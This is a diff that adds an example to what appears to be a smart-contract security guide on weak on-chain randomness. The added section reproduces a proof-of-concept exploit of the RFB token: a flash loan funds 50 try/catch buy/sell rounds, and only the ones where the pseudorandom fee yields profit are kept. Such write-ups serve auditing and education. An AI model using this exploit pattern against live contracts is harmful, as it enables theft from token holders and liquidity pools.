@@ -353,6 +353,55 @@ contract RNDLottery {
 
 ---
 
+### Example 7: RFB Token — Deterministic Fee Brute-Force (December 2022, BSC) [HIGH]
+
+**Real Exploit: RFB Token (2022-12) - WBNB Profit**
+
+```solidity
+// @PoC: DeFiHackLabs/src/test/2022-12/RFB_exp.sol
+// ❌ VULNERABLE: RFB uses on-chain pseudorandom fee for buy/sell taxes
+// Randomness is deterministic within a transaction — attacker brute-forces via try/catch
+
+// Step 1: Flash loan 20 WBNB
+DVM(dodo).flashLoan(20 * 1e18, 0, address(this), new bytes(1));
+
+function DPPFlashLoanCall(
+    address, uint256, uint256, bytes calldata
+) external {
+    WBNB.withdraw(20 * 1e18);
+    
+    // Step 2: Brute-force 50 buy/sell cycles via try/catch
+    // @audit Only keep rounds where random fee yields profit
+    for (uint256 i = 0; i < 50; i++) {
+        try this.check(20 * 1e18 - i) {}
+        catch { continue; }  // @audit Skip unprofitable rounds (revert)
+    }
+    
+    WBNB.deposit{value: address(this).balance}();
+    WBNB.transfer(dodo, 20 * 1e18);  // Repay flash loan
+    // Profit: remaining WBNB after repayment
+}
+
+function check(uint256 amount) public payable {
+    uint256 BNBBalance = address(this).balance;
+    BNBToRFB(amount);   // Buy RFB (random fee applied)
+    RFBToBNB();          // Sell RFB (random fee applied)
+    // @audit Revert if not profitable — deterministic within tx
+    require(address(this).balance - BNBBalance > 0);
+}
+
+// Why this works:
+// 1. The "random" fee is computed from block properties (block.timestamp, etc.)
+// 2. These are identical for ALL operations within the same transaction
+// 3. try/catch lets attacker skip unprofitable fee combinations
+// 4. Attacker only keeps rounds where buy fee < sell fee
+// 5. Over 50 attempts, enough profitable rounds accumulate
+```
+
+**Key Insight**: On-chain pseudorandom fees are exploitable even without predicting the exact fee value. The attacker uses `try/catch` to accept only profitable outcomes, turning a "random" mechanism into a guaranteed win. This is equivalent to a casino letting you undo losing bets.
+
+---
+
 ## Real-World Exploits Summary
 
 | Protocol | Date | Loss | Vulnerability Type |
